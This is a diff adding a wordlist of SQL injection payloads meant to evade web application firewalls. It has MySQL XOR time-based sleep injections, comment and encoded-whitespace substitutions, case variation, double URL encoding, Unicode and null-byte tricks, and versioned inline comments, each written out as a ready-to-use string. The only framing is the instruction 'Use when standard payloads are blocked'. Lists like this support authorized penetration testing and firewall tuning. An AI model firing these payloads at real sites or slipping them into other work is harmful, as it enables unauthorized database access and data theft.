@@ -1,0 +1,31 @@
+# WAF Bypass — XOR and Evasion Payloads
+# Use when standard payloads are blocked
+
+# --- XOR-based (MySQL) ---
+'XOR(if(now()=sysdate(),sleep(5),0))XOR'
+0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'
+'XOR(SELECT 0 FROM(SELECT(SLEEP(5)))v)XOR'
+
+# --- Space bypass ---
+'/**/AND/**/1=1--
+'/**/OR/**/1=1--
+'/**/UNION/**/SELECT/**/NULL--
+'%09AND%091=1--
+'%0aAND%0a1=1--
+
+# --- Case variation ---
+' aNd 1=1--
+' Or 1=1--
+' UnIoN SeLeCt NULL--
+
+# --- Double URL encode ---
+%2527
+%2527%2520OR%25201%253D1
+
+# --- HTML entity / Unicode ---
+'%u0020OR%u00201=1--
+' OR 1=1%00--
+
+# --- Inline comments ---
+'/*!50000 OR*/ 1=1--
+'/*!UNION*//*!SELECT*/NULL--
